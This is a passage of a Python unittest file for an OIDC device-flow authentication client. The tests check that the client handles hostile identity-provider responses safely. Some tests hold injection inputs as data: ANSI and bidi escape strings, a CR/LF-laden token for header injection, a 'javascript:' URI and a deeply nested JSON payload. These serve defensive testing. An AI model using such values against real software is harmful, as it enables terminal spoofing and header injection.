        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertIn(30, self._clock.sleeps)   # honored Retry-After on a 5xx

    def test_nonpositive_expires_in_still_polls(self):
        # A non-positive expires_in in the device-auth response must be treated
        # as unknown, not as "already expired" — otherwise the flow times out
        # before its first poll even though the user can still authorize. M2.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 0, 'interval': 5,
        }
        self.state.token_script = [(200, None)]  # success on the first poll
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(len(self.state.token_requests), 1)  # it actually polled

    def test_oversized_interval_is_clamped(self):
        # A hostile/huge interval must not pin the polling thread (which holds
        # the acquisition lock) in one enormous sleep; the per-poll sleep is
        # capped at _MAX_POLL_INTERVAL. M2.
        from questdb.auth._device import _MAX_POLL_INTERVAL
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 600, 'interval': 10 ** 9,
        }
        self.state.token_script = [(200, None)]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(self._clock.sleeps)
        self.assertLessEqual(max(self._clock.sleeps), _MAX_POLL_INTERVAL)

    def test_small_interval_clamped_to_min(self):
        # A sub-5s advertised interval is raised to the RFC 8628 default (5s):
        # we never poll faster than the spec baseline.
        from questdb.auth._device import _MIN_POLL_INTERVAL
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 600, 'interval': 1,
        }
        self.state.token_script = [(200, None)]
        auth = self.make_auth()
        auth.token()
        self.assertEqual(self._clock.sleeps, [_MIN_POLL_INTERVAL])

    def test_oversized_expires_in_is_capped(self):
        # A hostile expires_in must not keep the poll loop (and the lock) alive
        # indefinitely; the lifetime is capped so a never-authorized flow still
        # terminates promptly rather than looping millions of times. M2.
        from questdb.auth._device import (
            _MAX_DEVICE_CODE_LIFETIME, _MAX_POLL_INTERVAL)
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 10 ** 9, 'interval': 10 ** 9,  # interval clamps too
        }
        self.state.token_script = [(400, {'error': 'authorization_pending'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError):
            auth.token()
        max_polls = _MAX_DEVICE_CODE_LIFETIME // _MAX_POLL_INTERVAL + 1
        self.assertLessEqual(len(self.state.token_requests), max_polls)

    def test_access_denied_is_surfaced(self):
        self.state.token_script = [
            (400, {'error': 'access_denied',
                   'error_description': 'user said no'}),
        ]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertEqual(cm.exception.error, 'access_denied')
        self.assertIn('user said no', str(cm.exception))

    def test_hostile_error_fields_sanitized_in_exception(self):
        # A hostile/MITM'd IdP error/error_description must not smuggle terminal
        # escapes or a bidi override into the raised exception: an uncaught
        # traceback is a display sink (a terminal and Jupyter both interpret
        # ANSI) that the renderer's own sanitization never sees. OidcError
        # strips them centrally, so the message and the exposed attributes are
        # clean while the human-readable text still survives. (M2)
        self.state.token_script = [
            (400, {'error': 'access_denied\x1b[31m',
                   'error_description':
                       'denied \x1b[2J\x1b[1;1H\u202eevil.example\x07'}),
        ]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        for s in (str(cm.exception),
                  cm.exception.error or '',
                  cm.exception.error_description or ''):
            self.assertNotIn('\x1b', s)        # ESC stripped
            self.assertNotIn('\x07', s)        # BEL stripped
            self.assertNotIn('\u202e', s)      # bidi override stripped
        self.assertIn('denied', str(cm.exception))
        self.assertIn('evil.example', cm.exception.error_description)

    def test_device_endpoint_rejects_grant(self):
        self.state.device_status = 400
        self.state.device_response = {'error': 'invalid_client'}
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertIn('device grant', str(cm.exception))

    def test_token_caches_in_memory_across_instances(self):
        self.make_auth().token()
        self.assertEqual(self.state.device_requests, 1)
        # A brand-new instance with the same config reuses the cached token.
        self.make_auth().token()
        self.assertEqual(self.state.device_requests, 1)

    def test_groups_mode_missing_id_token_fails_without_caching(self):
        # groups_in_token=True but the completed grant carries only an
        # access_token: the poll must reject it as a terminal flow error and
        # NOT cache it (otherwise every later token() re-runs the whole
        # interactive flow). See M1.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})]  # no id_token
        auth = self.make_auth(groups_in_token=True)
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)  # nothing was cached

    def test_groups_mode_accepts_id_token_without_access_token(self):
        # A completed grant that returns only an id_token (no access_token) is
        # usable in groups mode and must be returned, not discarded as it was
        # when success gated on access_token. See M1.
        self.state.token_script = [(200, {
            'id_token': ID_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})]  # no access_token
        auth = self.make_auth(groups_in_token=True)
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_200_without_access_token_is_not_success(self):
        # A 200 with no access_token must not be treated as a token.
        self.state.token_script = [(200, {'token_type': 'Bearer'})]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()

    def test_groups_mode_rejects_control_char_in_network_id_token(self):
        # M3: a token straight from the (untrusted) IdP token endpoint is screened
        # for control / non-ASCII chars exactly like a file-loaded one — a decoded
        # CR/LF in the served token is an Authorization-header / _sso-password
        # injection vector. groups mode serves the id_token, so a control char
        # there must fail the grant terminally and cache nothing, not route a
        # tampered credential onto the wire. (The persistence path already screens
        # this; the network path must too, since the IdP is equally untrusted.)
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': 'bad\r\nid-token',
            'refresh_token': 'REFRESH-1', 'token_type': 'Bearer',
            'expires_in': 3600})]
        auth = self.make_auth(groups_in_token=True)
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)  # nothing cached

    def test_access_mode_rejects_control_char_in_network_access_token(self):
        # M3, the OTHER served kind: with groups not in the token, token() serves
        # the access_token, so a control char there must reject the grant too.
        self.state.token_script = [(200, {
            'access_token': 'bad\x00access', 'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-1', 'token_type': 'Bearer',
            'expires_in': 3600})]
        auth = self.make_auth(groups_in_token=False)
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)

    def test_blank_network_token_treated_as_missing(self):
        # A served token that is blank (empty or whitespace-only) must read as
        # ABSENT — not be cached and sent as "Bearer <spaces>". A run of spaces
        # passes the printable-ASCII injection gate, so without an explicit blank
        # check it would slip through and defeat the "fail once with a clear
        # error, don't cache an unusable token" guarantee: the client would serve
        # the blank token until expiry instead of surfacing the actionable "IdP
        # returned no id_token" error. Mirrors the control-char pair above for
        # both served kinds.
        from questdb.auth._device import _safe_token_or_none
        self.assertIsNone(_safe_token_or_none('   '))     # all spaces
        self.assertIsNone(_safe_token_or_none(''))         # empty
        self.assertIsNone(_safe_token_or_none(' \t '))     # tab non-printable too
        self.assertEqual(                                  # inner space is kept
            _safe_token_or_none('tok en'), 'tok en')
        # groups mode serves the id_token: a blank one fails terminally, no cache.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': '   ',
            'token_type': 'Bearer', 'expires_in': 3600})]
        auth = self.make_auth(groups_in_token=True)
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)
        # access mode serves the access_token: a blank one likewise fails.
        self.state.token_script = [(200, {
            'access_token': '   ', 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 3600})]
        auth = self.make_auth(groups_in_token=False)
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)

    def test_access_token_headers(self):
        auth = self.make_auth(groups_in_token=False)
        self.assertEqual(auth.headers(),
                         {'Authorization': 'Bearer ' + ACCESS_TOKEN})

    def test_clear_forces_resignin(self):
        # A stateful renderer confirms the prompt is drawn END-TO-END on the
        # second sign-in (not merely that the device endpoint is hit again):
        # clear() then token() must re-run on_prompt, exercising the renderer's
        # own re-sign-in reset path too.
        prompts = []

        class _CountingRenderer(Renderer):
            def on_prompt(self, resp):
                prompts.append(resp.get('user_code'))

        auth = self.make_auth(renderer=_CountingRenderer())
        auth.token()
        self.assertEqual(self.state.device_requests, 1)
        auth.clear()
        auth.token()
        self.assertEqual(self.state.device_requests, 2)  # prompted again
        self.assertEqual(len(prompts), 2)                # renderer saw both

    def test_openid_scope_auto_added_for_groups_in_token(self):
        # groups-in-token requires an id_token, which needs the openid scope.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            scope='groups', groups_in_token=True,  # no 'openid'
            insecure=True, renderer=Renderer())
        self.assertIn('openid', auth.config.scope.split())

    def test_constructor_rejects_bad_typed_args(self):
        # A bad-typed constructor arg must raise the typed OidcConfigError, not a
        # bare AttributeError/TypeError surfacing later from scope.split(),
        # safe_urlparse(<non-str>), or the cache-key join. (from_questdb is
        # unaffected — resolve_config guarantees strings.) See review Minors.
        good = dict(
            client_id='questdb',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            renderer=Renderer())
        OidcDeviceAuth(**good)  # sanity: the good kwargs construct fine
        for bad in (
                {'client_id': None}, {'client_id': 123}, {'client_id': ''},
                {'device_authorization_endpoint': 123},
                {'device_authorization_endpoint': None},
                {'token_endpoint': 123}, {'token_endpoint': ''},
                {'scope': None}, {'scope': 123},
                {'scope': None, 'groups_in_token': True},  # the scope.split() case
                {'audience': 123}, {'issuer': 123},
                # default_interval / timeout feed the poll-interval clamp and
                # urllib socket calls; a non-numeric/non-positive/NaN value must
                # raise the typed error, not a bare TypeError later. bool is an
                # int subclass, so it's rejected explicitly.
                {'default_interval': 'soon'}, {'default_interval': 0},
                {'default_interval': -1}, {'default_interval': True},
                {'default_interval': float('nan')},
                {'default_interval': float('inf')},
                {'timeout': 'slow'}, {'timeout': 0}, {'timeout': -5},
                {'timeout': True}, {'timeout': float('nan')},
                # M2: inf passes ``> 0`` but crashes socket.settimeout with a
                # bare OverflowError, and a too-large int does the same; both
                # must raise the typed error up front, not escape from urllib.
                {'timeout': float('inf')}, {'timeout': float('-inf')},
                {'timeout': 10 ** 1000}, {'default_interval': 10 ** 1000},
                # An int with >4300 digits: the finite-check rejects it, but the
                # error message must not repr() it — repr() on such an int itself
                # raises ValueError (CPython's int->str limit), which would escape
                # the typed-error contract. 10**1000 above is only 1001 digits,
                # UNDER the limit, so it does not exercise this; 10**5000 does.
                {'timeout': 10 ** 5000}, {'default_interval': 10 ** 5000}):
            with self.assertRaises(OidcConfigError):
                OidcDeviceAuth(**{**good, **bad})
        # A float interval/timeout is fine (clamped / passed to the socket).
        OidcDeviceAuth(**{**good, 'default_interval': 7.5, 'timeout': 12.0})
        # from_questdb consumes `timeout` before the constructor runs, so it
        # validates up front too — and before any network call, so a bad value
        # fails fast without reaching the (unreachable) server.
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                'https://db.example.com:9000', timeout='slow')
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                'https://db.example.com:9000', default_interval=-1)

    def test_groups_in_token_coerced_to_bool(self):
        # m2: a truthy non-bool groups_in_token (e.g. 2, from an env read without
        # a cast) is used truthily everywhere in memory, but the on-disk store
        # keyed the file as groups=1 while _parse_and_verify compared the raw
        # value (`bool(file) != 2`), so a persisted entry failed its OWN reload
        # and re-prompted every restart. The constructor now coerces it to a real
        # bool so the in-memory and on-disk identities agree.
        base = dict(
            client_id='c',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            scope='openid', renderer=Renderer())
        self.assertIs(
            OidcDeviceAuth(**base, groups_in_token=2).config.groups_in_token,
            True)
        self.assertIs(
            OidcDeviceAuth(**base, groups_in_token=0).config.groups_in_token,
            False)

    def test_zero_expires_in_is_treated_as_unknown(self):
        # A non-positive expires_in must not mark the just-issued token expired.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 0})]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_negative_expires_in_treated_as_unknown(self):
        # A negative expires_in (like zero) must be treated as unknown, not mark
        # the just-issued token expired — guards the `<= 0` check against an
        # `== 0` regression. Review m6.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': -100})]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_bool_expires_in_treated_as_unknown(self):
        # A JSON bool expires_in must NOT be read as int(True) == 1 (a 1-second
        # token that churns refreshes / re-prompts); treat it as unknown so the
        # just-issued token is valid.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': True})]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_int_or_default_rejects_bool_and_nonnumeric(self):
        # _int_or_default underpins expires_in / interval parsing on both the
        # token and device-authorization responses: a JSON bool maps to the
        # default (not int(True) == 1), and non-numeric / NaN / Infinity /
        # missing fall back too, while a real number (or numeric string) passes.
        from questdb.auth._device import _int_or_default
        for bad in (True, False, 'abc', None, float('nan'), float('inf'), [1]):
            self.assertEqual(_int_or_default(bad, 300), 300, repr(bad))
        self.assertEqual(_int_or_default(600, 300), 600)
        self.assertEqual(_int_or_default('600', 300), 600)
        self.assertEqual(_int_or_default(1.9, 300), 1)  # truncates, like int()

    def test_short_lived_token_valid_at_issue(self):
        # A small positive expires_in (< 2*skew) must not read as expired the
        # instant it is issued (adaptive skew = min(skew, lifetime/2)).
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 20})]
        auth = self.make_auth()
        auth.token()
        t = auth._tokens
        self.assertEqual(round(t.expires_at - t.issued_at), 20)
        self.assertTrue(t.is_valid(t.issued_at))    # usable right after issue
        self.assertFalse(t.is_valid(t.expires_at))  # but still does expire

    def test_is_valid_caps_skew_when_issued_at_unknown(self):
        # issued_at == 0 means "unknown issue time": a short-lived token that
        # arrives without one must still be usable at issue (skew capped to half
        # the remaining lifetime), not read as expired immediately. (Before the
        # cap applied for issued_at == 0, is_valid(now) returned False here.) Not
        # reachable via _tokenset_from_response, which always sets issued_at — a
        # guard for a future caller or a token restored without one. Review m3.
        now = 1_000_000.0
        short = TokenSet(access_token='a', expires_at=now + 20, issued_at=0.0)
        self.assertTrue(short.is_valid(now))         # usable right at issue
        self.assertFalse(short.is_valid(now + 20))   # but still expires
        self.assertFalse(short.is_valid(now + 100))  # and stays expired after

    def test_overflow_expires_in_treated_as_unknown(self):
        # A non-finite expires_in (JSON Infinity, which json.loads accepts and
        # int(inf) turns into an OverflowError — not a ValueError) must not
        # crash; treat it as unknown so the token stays usable. See M1.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': float('inf')})]
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_nan_expires_in_treated_as_unknown(self):
        # A NaN token expires_in: int(nan) raises ValueError — a DIFFERENT
        # exception type from the OverflowError that inf raises above — so it
        # exercises a separate except arm. Must be treated as unknown so the
        # token stays usable, not crash. Review m6.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': float('nan')})]
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_missing_expires_in_defaults_to_short_ttl(self):
        # When the IdP omits expires_in, fall back to a short, conservative TTL
        # (300s) so the token is refreshed promptly, matching the Java client.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer'})]  # no expires_in
        auth = self.make_auth()
        auth.token()
        t = auth._tokens
        self.assertEqual(round(t.expires_at - t.issued_at), 300)

    def test_oversized_token_expires_in_is_capped(self):
        # A very long (or hostile) token lifetime is capped at 3600s so a cached
        # token is re-validated at least hourly, matching the Java client.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 10 ** 9})]
        auth = self.make_auth()
        auth.token()
        t = auth._tokens
        self.assertEqual(round(t.expires_at - t.issued_at), 3600)

    def test_overflow_device_timing_fields_do_not_crash(self):
        # Non-finite interval / expires_in in the device-auth response (JSON
        # Infinity) must be treated as unknown, not raise OverflowError. See M1.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': float('inf'), 'interval': float('inf')}
        self.state.token_script = [(200, None)]  # success on the first poll
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_nan_device_timing_fields_do_not_crash(self):
        # NaN interval / expires_in in the device-auth response: int(nan) raises
        # ValueError, not the OverflowError that inf raises above — a different
        # except arm. Must be treated as unknown, not crash. Review m6.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': float('nan'), 'interval': float('nan')}
        self.state.token_script = [(200, None)]  # success on the first poll
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_deeply_nested_jwt_payload_does_not_crash(self):
        # A hostile/buggy IdP returning an id_token whose payload base64-decodes
        # to deeply-nested JSON must not crash token() with a raw RecursionError
        # from the best-effort identity decode (RecursionError is not a
        # ValueError); the decode degrades to no-identity and the token is still
        # returned. See _decode_jwt_claims.
        payload = base64.urlsafe_b64encode(
            (('[' * 60000) + (']' * 60000)).encode()).rstrip(b'=').decode()
        nested = f'aaa.{payload}.sig'
        self.state.token_script = [(200, {
            'id_token': nested, 'token_type': 'Bearer', 'expires_in': 3600})]
        auth = self.make_auth()
        self.assertEqual(auth.token(), nested)

    def test_non_object_jwt_payload_does_not_crash(self):
        # A well-formed (3-part) JWT whose base64 payload decodes to valid JSON
        # that is NOT an object — a list / string / number from a buggy or
        # hostile IdP — must read as no-claims, not crash. _decode_jwt_claims
        # guards this with `isinstance(claims, dict)`; without it, claims.get()
        # in _tokenset_from_response (sub) and _identity_from_claims would raise
        # AttributeError on the SUCCESS path, discarding an already-authorized
        # token and re-prompting on every later token() call. See
        # _decode_jwt_claims.
        from questdb.auth._device import _decode_jwt_claims
        for payload in ([1, 2, 3], 'a-string', 42, 3.5):
            self.assertEqual(_decode_jwt_claims(_jwt(payload)), {})
        # End-to-end: the IdP returns an id_token whose payload is a JSON array;
        # the success-path identity decode must degrade to no-identity and the
        # token must still be returned and cached.
        array_token = _jwt([1, 2, 3])
        self.state.token_script = [(200, {
            'id_token': array_token, 'token_type': 'Bearer',
            'expires_in': 3600})]
        auth = self.make_auth()
        self.assertEqual(auth.token(), array_token)
        self.assertEqual(auth._tokens.id_token, array_token)
        self.assertIsNone(auth._tokens.sub)

    def test_corrupt_jwt_middle_segment_does_not_crash(self):
        # A 3-segment token whose middle segment is invalid base64, or decodes to
        # non-UTF-8 / non-JSON bytes (a malformed or hostile id_token), must
        # degrade to no-claims rather than crash the best-effort identity decode
        # (the binascii.Error / UnicodeDecodeError / ValueError arms). See
        # _decode_jwt_claims.
        from questdb.auth._device import _decode_jwt_claims

        def seg(raw):
            return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()

        for bad in (
                'aaa.A.sig',                                  # bad base64 length
                f'aaa.{seg(bytes([0x80, 0x81, 0x82]))}.sig',  # non-UTF-8 bytes
                f'aaa.{seg(b"not json")}.sig'):               # valid text, not JSON
            self.assertEqual(_decode_jwt_claims(bad), {})

    def test_select_raises_config_error_when_required_kind_absent(self):
        # _select is the final gate before a token is handed to QuestDB. Every
        # caller already checks _has_required_token, so its own OidcConfigError
        # branch is defense-in-depth -- but assert it directly: in groups mode a
        # TokenSet without an id_token, and otherwise one without an
        # access_token, must raise a clear config error (not return None/empty).
        groups_auth = self.make_auth(groups_in_token=True)
        with self.assertRaises(OidcConfigError) as cm:
            groups_auth._select(
                TokenSet(access_token=ACCESS_TOKEN, id_token=None))
        self.assertIn('id_token', str(cm.exception))
        access_auth = self.make_auth(groups_in_token=False)
        with self.assertRaises(OidcConfigError) as cm:
            access_auth._select(TokenSet(access_token=None))
        self.assertIn('access_token', str(cm.exception))

    def test_non_string_token_fields_do_not_crash(self):
        # A buggy/hostile IdP returning a non-string access_token / id_token (a
        # JSON number/bool/object) must not crash token() with a raw
        # AttributeError from the best-effort JWT decode, nor be stored and
        # emitted as ``Bearer <non-str>``. The non-string token reads as absent,
        # so the grant fails with the clear terminal error and nothing is
        # cached. See M2.
        self.state.token_script = [(200, {
            'access_token': 12345, 'id_token': {'not': 'a-jwt'},
            'token_type': 'Bearer', 'expires_in': 3600})]
        auth = self.make_auth()  # groups_in_token=False -> needs access_token
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)  # nothing was cached

    def test_tokenset_from_response_coerces_non_string_credentials(self):
        # _tokenset_from_response coerces every non-string credential field to
        # None (treated as absent), and _decode_jwt_claims is total on any
        # non-string input. See M2.
        from questdb.auth._device import _decode_jwt_claims
        auth = self.make_auth()
        ts = auth._tokenset_from_response({
            'access_token': 123, 'id_token': True,
            'refresh_token': ['x'], 'expires_in': 3600})
        self.assertIsNone(ts.access_token)
        self.assertIsNone(ts.id_token)
        self.assertIsNone(ts.refresh_token)
        # token_type / scope are coerced too: a non-string falls back to the
        # default ('Bearer' / the configured scope) instead of landing raw in
        # the frozen dataclass; a valid string passes through unchanged.
        ts_bad = auth._tokenset_from_response({
            'access_token': ACCESS_TOKEN, 'token_type': ['x'],
            'scope': 123, 'expires_in': 3600})
        self.assertEqual(ts_bad.token_type, 'Bearer')
        self.assertEqual(ts_bad.scope, auth.config.scope)
        ts_ok = auth._tokenset_from_response({
            'access_token': ACCESS_TOKEN, 'token_type': 'DPoP',
            'scope': 'openid email', 'expires_in': 3600})
        self.assertEqual(ts_ok.token_type, 'DPoP')
        self.assertEqual(ts_ok.scope, 'openid email')
        for bad in (123, 1.5, True, {'a': 1}, [1, 2], None, ''):
            self.assertEqual(_decode_jwt_claims(bad), {})

    def test_idp_requests_use_configured_timeout(self):
        # The device-code / poll / refresh POSTs must use the configured
        # timeout, so a stalled IdP can't pin the acquisition lock for the
        # urllib default (30s) per network leg. See M3.
        seen = []

        def fake_post_form(url, form, *, ctx=None, insecure=False,
                           timeout=None):
            seen.append(timeout)
            if url.endswith('/device'):
                return 200, {'device_code': 'D', 'user_code': 'U',
                             'verification_uri': 'https://idp/d',
                             'expires_in': 600, 'interval': 5}
            return 200, {'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
                         'token_type': 'Bearer', 'expires_in': 3600}

        from questdb.auth import _device
        auth = self.make_auth(timeout=3)
        with mock.patch.object(_device, 'post_form', fake_post_form):
            self.assertEqual(auth.token(), ID_TOKEN)
        self.assertTrue(seen)
        self.assertTrue(
            all(t == 3 for t in seen),
            f'IdP POSTs did not all use the configured timeout: {seen}')

    def test_from_questdb_defers_signin(self):
        # from_questdb() must return WITHOUT running the device flow; the first
        # token-needing call then triggers exactly one sign-in.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device'}}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, renderer=Renderer(),
            interactive=True, _clock=FakeClock())
        self.assertEqual(self.state.device_requests, 0)  # deferred
        self.assertEqual(auth.token(), ID_TOKEN)          # first use signs in
        self.assertEqual(self.state.device_requests, 1)

    def test_open_browser_rejects_dangerous_scheme(self):
        auth = self.make_auth(open_browser=True)
        with mock.patch('webbrowser.open') as opener:
            auth._maybe_open_browser({'verification_uri': 'javascript:alert(1)'})
            opener.assert_not_called()
            auth._maybe_open_browser(
                {'verification_uri': 'https://idp.example.com/device'})
            opener.assert_called_once_with('https://idp.example.com/device')

    def test_open_browser_falls_back_past_unsafe_complete(self):
        # A truthy-but-unsafe verification_uri_complete must not shadow a usable
        # verification_uri: each field is vetted independently (complete-then-
        # plain), so the browser opens the SAME safe target the prompt and QR
        # show, instead of opening nothing — the link/browser/QR can't diverge.
        auth = self.make_auth(open_browser=True)
        with mock.patch('webbrowser.open') as opener:
            auth._maybe_open_browser({
                'verification_uri_complete': 'javascript:alert(1)',
                'verification_uri': 'https://idp.example.com/device'})
            opener.assert_called_once_with('https://idp.example.com/device')

    def test_open_browser_default_is_true(self):
        # We try to open the browser by default ("always when possible"), via
        # both the explicit constructor and discovery.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            insecure=True, renderer=Renderer(), _clock=FakeClock())
        self.assertTrue(auth.open_browser)
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device'}}
        disc = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, renderer=Renderer(), _clock=FakeClock())
        self.assertTrue(disc.open_browser)

    def test_signin_opens_browser_by_default(self):
        # On a (non-kernel) terminal, signing in opens the verification URL with
        # no opt-in — make_auth() leaves open_browser at its default.
        auth = self.make_auth()
        auth.token()
        self.mock_browser_open.assert_called_once_with(
            'https://idp.example.com/device?user_code=WDJB-MJHT')

    def test_open_browser_suppressed_in_notebook_kernel(self):
        # Never open on a (possibly remote) notebook kernel, even when enabled:
        # the kernel host is not the user's machine.
        auth = self.make_auth(open_browser=True)
        with mock.patch('questdb.auth._device.in_ipython_kernel',
                        return_value=True):
            auth._maybe_open_browser(
                {'verification_uri': 'https://idp.example.com/device'})
        self.mock_browser_open.assert_not_called()

    def test_maybe_open_browser_swallows_open_error(self):
        # webbrowser.open raising (no browser / a bad $BROWSER) must not break
        # sign-in: opening is best-effort, the prompt is already shown.
        auth = self.make_auth(open_browser=True)
        with mock.patch('webbrowser.open', side_effect=RuntimeError('boom')):
            auth._maybe_open_browser(  # must not raise
                {'verification_uri': 'https://idp.example.com/device'})

    def test_identity_from_claims_precedence(self):
        # The sign-in success message picks an identity in a fixed precedence:
        # email > preferred_username > upn > name > sub.
        from questdb.auth._device import _identity_from_claims
        self.assertEqual(_identity_from_claims({
            'email': 'a@x', 'preferred_username': 'pu', 'upn': 'u',
            'name': 'N', 'sub': 's'}), 'a@x')
        self.assertEqual(_identity_from_claims({
            'preferred_username': 'pu', 'upn': 'u', 'name': 'N',
            'sub': 's'}), 'pu')
        self.assertEqual(_identity_from_claims({'upn': 'u', 'sub': 's'}), 'u')
        self.assertEqual(_identity_from_claims({'name': 'N', 'sub': 's'}), 'N')
        self.assertEqual(_identity_from_claims({'sub': 's'}), 's')
        self.assertEqual(_identity_from_claims({'sub': 123}), '123')  # stringified
        self.assertIsNone(_identity_from_claims({}))
        self.assertIsNone(_identity_from_claims({'email': ''}))  # empty skipped

    def test_memory_cache_returns_independent_copy(self):
        cache = MemoryCache()
        stored = TokenSet(access_token='a', refresh_token='r', expires_at=1.0)
        cache.store('k', stored)
        # Each load is a distinct copy — never the object handed to store(), nor
        # shared between loads — so a cached entry can't be aliased and reused.
        first = cache.load('k')
        second = cache.load('k')
        self.assertIsNot(first, stored)
        self.assertIsNot(first, second)
        self.assertEqual(first.refresh_token, 'r')

    def test_tokenset_is_frozen(self):
        # TokenSet is immutable: the lock-free fast path reads a published
        # TokenSet without a lock, which is only safe if its fields never change
        # after construction. Mutating one must raise, not silently succeed.
        import dataclasses
        t = TokenSet(access_token='a', refresh_token='r', expires_at=1.0)
        with self.assertRaises(dataclasses.FrozenInstanceError):
            t.refresh_token = 'MUTATED'
        # Deriving a modified copy is the supported idiom.
        t2 = dataclasses.replace(t, refresh_token='r2')
        self.assertEqual(t.refresh_token, 'r')
        self.assertEqual(t2.refresh_token, 'r2')

    def test_tokenset_repr_redacts_secrets(self):
        # The access/id/refresh tokens must never appear in repr() — a TokenSet
        # landing in a log line or traceback would otherwise leak credentials.
        # The JWT subject (PII) is redacted too; non-secret metadata stays.
        r = repr(TokenSet(access_token='SECRET-A', id_token='SECRET-I',
                          refresh_token='SECRET-R', sub='subject-PII-12345',
                          scope='openid'))
        self.assertNotIn('SECRET-A', r)
        self.assertNotIn('SECRET-I', r)
        self.assertNotIn('SECRET-R', r)
        self.assertNotIn('subject-PII-12345', r)
        self.assertIn('openid', r)  # non-secret metadata still shown


class TestNonInteractive(AuthTestBase):
    def test_non_interactive_raises_without_polling(self):
        auth = self.make_auth(interactive=False)
        with self.assertRaises(OidcInteractionRequired):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)

    def test_papermill_kernel_fails_fast(self):
        # End-to-end auto-detection (no explicit interactive= override): a
        # papermill-style kernel (a real kernel, but allow_stdin=False) makes
        # token() raise OidcInteractionRequired immediately — no device request,
